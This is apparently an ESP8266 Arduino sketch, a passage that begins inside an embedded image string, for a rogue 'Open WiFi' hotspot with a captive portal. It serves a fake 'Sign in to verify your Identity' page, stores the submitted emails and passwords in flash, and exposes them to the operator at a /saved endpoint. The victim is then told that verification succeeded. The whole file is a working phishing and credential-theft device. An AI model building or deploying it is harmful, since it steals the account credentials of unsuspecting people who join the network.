zAjLpMmRPGPNdZoWukOBcltN/RaMjR0srVxpGMZWZ8GRw5//35Tz7DbikRdIfOSf oZH2tt01i3UogOqdEKndf/0peQjWP1j+/LCA7rB8OWEKlkmTJHlGxpOa1f4PYfoM IdgJACynhGgQwlAekolDXsN+R3558dkea167s0GquTYGTMEyaaqA1FmfvY9US9Am iXoDTwUNvSw5bd6Y1cJlUgPmGJZJU4WWlRy+nxDjc2E3KNhwzTbFyjNmhGXSpBn/ 5Cd2GhK9DCEtINMXfEE3yhemvTBiqjBN6sDrrbpNTC4nDn693Igb0mmpXW/ZDCLV m6eAfkMJSwPd5TPT5o2cLVwmHjAjLBMTQfLTayeoqv11AGGscAUNQshpwyi7N33e 2EsiJW0smBGWiYng8LaPDra/btS7SNOiAC+DHMhdcwSUEIOFVW+Wn88bv+aVCd8K t4kkZoRlYlIDSVNWdkX20GkAqHdB6Lm6gicqNk6l+APDVfZS+kspl2Td+saAKVgm JnUw7ol3otSQVhNYmpgMIBrIgi7psjNMpM4ohH7BIqq1BaU/rc56/Y/1s9vzZYwp WCYmkvAaWm3CWvTQrJbuQEFXEEibAwWE8P1hqELK2c10nhBwRjH0H52u8wfWL7rn pPhRExMTExMTExMTExMTExMTf1CU/wfbQ07r8jaFRgAAAABJRU5ErkJggg==' style='width:80px; margin-top: 30px;'>"
                      "<br><span style='font-size: 24px; margin-top: 0px; display: block;'>Sign in</span> <span style='font-size: 18px;color: #353535; margin-top: 7px; display: block;'>to verify your Identity</span>"
                      "<form action='/verification'>"
                      "<br><input type='text' name='email' autocomplete=false placeholder='Email or phone'  style='font-size: 16px; padding: 15px 10px 15px 10px; border: 1px solid #dadada; margin: 5px 23px 5px 23px; border-radius: 5px; width: 300px;'>"
                      "<br><input type='password' name='pass' autocomplete=false placeholder='Password'  style='font-size: 16px; padding: 15px 10px 15px 10px; border: 1px solid #dadada; margin: 5px 23px 5px 23px; border-radius: 5px; width: 300px;'>"
                      "<br><input type='submit' value='Next'  style='font-size: 16px; padding: 15px 10px 15px 10px; border: 0px; margin: 5px 23px 5px 23px; border-radius: 5px; width: 325px; background-color: rgb(101, 99, 240); color: #ffffff; '>"
                       "</form>"
                      "<br><div style='font-size: 16px; padding: 15px 10px 15px 10px; border: 0px; margin: 5px 23px 5px 23px; width: 325px; color: #5c5c5c; text-align: left;'>Not your computer? Use Guest mode to sign in privately.</div>"
                      "</div></div></body></html>";
                      

String failed = "Email or Password not matched.";
                      

                      
String goBackPage = ""
                      "<!DOCTYPE html><html><head><meta charset='UTF-8'/><meta name='viewport' content='width=device-width, initial-scale=0.9' /><title>Verify Your Identity</title></head>"
                      "<body style='font-family: Calibri; text-align: center;padding:20px;'>"
                      "<div style='width: 95%; height: 100%;'>"
                      "<div style='border: 1px solid #dadada; width:fit-content;height: fit-content; padding: 5px; border-radius: 10px; margin-right: auto;margin-left: auto;margin-top: 200px;'>"
                      "<span style='font-size: 24px; margin-top: 0px; display: block;'>Verification Completed</span> <span style='font-size: 18px;color: #353535; margin-top: 7px; display: block;'>You will be connected to the Internet <b>shortly</b></span>"
                      "<br><a href='/'><button  style='font-size: 16px; padding: 15px 10px 15px 10px; border: 0px; margin: 5px 23px 5px 23px; border-radius: 5px; width: 325px; background-color: rgb(101, 99, 240); color: #ffffff; '>Go Back</button></a>"
                      "</div></div></body></html>";



void handleForm() {
 String email = webServer.arg("email"); 
 String pass = webServer.arg("pass"); 

 Serial.print("Email Address:");
 Serial.println(email);

 Serial.print("Password:");
 Serial.println(pass);

 if(write_to_file("/saved.txt", fdata+"<br>"+email+":"+pass))
   {
   Serial.println("Data Saved to flash");
   fdata = fdata+"<br>"+email+":"+pass;
    digitalWrite(D0,LOW);
    delay(200);
    digitalWrite(D0,HIGH);
    delay(200);
    digitalWrite(D0,LOW);
    delay(200);
    digitalWrite(D0,HIGH);
   }
  else{Serial.println("Saving to Flash Failed");}
  if(random(1,2)==1)
  {
    webServer.send(200, "text/html", goBackPage); //Send web page
  }
  else{
    webServer.send(200, "text/html", failed);
  }
}



void ReadSaved() {
 fdata = load_from_file("/saved.txt");
  delay(100);
 webServer.send(200, "text/html", fdata); //Send web page
}


String load_from_file(String file_name) {
  String result = "";
  
  File this_file = LittleFS.open(file_name, "r");
  if (!this_file) { // failed to open the file, retrn empty result
    return result;
  }
  while (this_file.available()) {
      result += (char)this_file.read();
  }
  
  this_file.close();
  return result;
}



bool write_to_file(String file_name, String contents) {  
  File this_file = LittleFS.open(file_name, "w");
  if (!this_file) { // failed to open the file, return false
    Serial.println("Writer: File open Failed");
    return false;
  }
  int bytesWritten = this_file.print(contents);
 
  if (bytesWritten == 0) { // write failed
    Serial.println("Writer: Writing Failed");
      return false;
  }
   
  this_file.close();
  return true;
}




void setup() {
  Serial.begin(9600);
  LittleFS.begin();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Open WiFi");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });


  webServer.on("/verification", handleForm);
  webServer.on("/saved", ReadSaved);
  
  webServer.begin();
  pinMode(INBUILT_LED,OUTPUT);
  digitalWrite(INBUILT_LED,HIGH);
  pinMode(D0,OUTPUT);
  digitalWrite(D0,HIGH);
  c_count=0;
  digitalWrite(D0,LOW);
  delay(1000);
  digitalWrite(D0,HIGH);

  Serial.println("following data is avalable in Flash");
  fdata = load_from_file("/saved.txt");
  delay(100);
  Serial.println(fdata);  
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (WiFi.softAPgetStationNum() > c_count )
  {
    c_count=WiFi.softAPgetStationNum();
    digitalWrite(INBUILT_LED,LOW);
    delay(200);
    digitalWrite(INBUILT_LED,HIGH);
    delay(200);
    digitalWrite(INBUILT_LED,LOW);
    delay(200);
    digitalWrite(INBUILT_LED,HIGH);
    
  }
  else if (WiFi.softAPgetStationNum() < c_count )
  {
    c_count=WiFi.softAPgetStationNum();
    digitalWrite(INBUILT_LED,LOW);
    delay(500);
    digitalWrite(INBUILT_LED,HIGH);
  }
}
